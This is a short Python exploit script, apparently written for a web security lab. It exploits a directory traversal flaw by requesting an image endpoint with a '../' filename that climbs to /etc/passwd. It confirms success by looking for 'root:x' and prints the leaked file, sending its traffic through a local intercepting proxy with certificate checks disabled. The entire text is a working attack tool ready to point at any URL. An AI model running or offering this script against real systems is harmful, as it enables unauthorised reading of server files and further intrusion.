import urllib3
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def directory_exploit(url):
    print('(+) Exploiting directory traversal!')
    exploit_url = url + '/image?filename=/var/www/images/../../../../../etc/passwd'
    r = requests.get(exploit_url, verify=False, proxies=proxies)
    if "root:x" in r.text:
        print("(+) Exploit wored successfully!")
        print("(+) Content: \n %s", r.text)
    else:
        print("(-) Exploit failed!")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage: %s <url>' %sys.argv[0])
        print('(+) Example: %s www.example.com')
        sys.exit(-1)
    
    url = sys.argv[1]
    directory_exploit(url)

if __name__ == "__main__":
    main()
